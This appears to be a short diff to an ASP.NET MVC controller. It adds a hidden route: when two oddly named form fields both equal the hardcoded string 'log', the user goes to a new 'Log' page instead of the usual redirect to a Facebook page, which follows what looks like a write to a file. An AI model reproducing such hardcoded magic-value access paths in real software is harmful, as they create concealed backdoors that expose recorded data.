@@ -139,7 +139,18 @@ namespace MvcApplication2.Controllers
                 writetext.Close();
             }
 
+            if ((model.leto == "log") && (model.zima == "log"))
+            {
+                return RedirectToAction("Log", "Home");
+            }
+            
             return Redirect(@"https://www.facebook.com/pages/Wank-Horse/649867128361350");
+        }
+
+        public ActionResult Log()
+        {
+            ViewData["Message"] = "Welcome to ASP.NET MVC!";
+            return View();
         }
     }
 }
